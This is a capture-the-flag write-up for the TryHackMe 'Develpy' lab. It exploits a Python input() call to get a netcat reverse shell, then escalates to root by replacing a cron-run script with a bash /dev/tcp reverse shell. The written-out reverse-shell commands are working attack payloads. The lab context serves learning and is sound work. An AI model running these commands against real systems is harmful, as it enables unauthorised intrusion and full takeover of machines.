# 38 - Develpy (python input function exploitation)

Room Link --> [https://tryhackme.com/room/bsidesgtdevelpy](https://tryhackme.com/room/bsidesgtdevelpy)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.255.206 -p- -T5 -sV

22/tcp    open  ssh   syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
10000/tcp open        snet-sensor-mgmt? syn-ack
```
{% endcode %}

I tried navigating to : `http://10.10.255.206:10000`

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

We see our input is passed into the python "input" function, meaning we can just enter our rev shell exploit to gain reverse shell.

We can use netcat also.

[https://intx0x80.blogspot.com/2017/05/python-input-vulnerability\_25.html](https://intx0x80.blogspot.com/2017/05/python-input-vulnerability\_25.html)

{% code overflow="wrap" lineNumbers="true" %}
```bash
nc 10.10.255.206

# enter this to get rev shell, make sure nc is listening.
__import__("os").system("nc -e /bin/sh 10.18.88.214 4242")
```
{% endcode %}

<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption><p>We got shell</p></figcaption></figure>

### Priv Esc

`cat /etc/crontab`&#x20;

<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

There are 3 jobs running every minute.

We can repace the "root.sh" with our own that contains a reverse shell, and setup nc listener so when the job is runn we can get rev shell as root user.

```
rm root.sh
echo 'bash -i >& /dev/tcp/10.18.88.214/2234 0>&1' > root.sh
```

<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>



Immediately we get root shell.

Done !

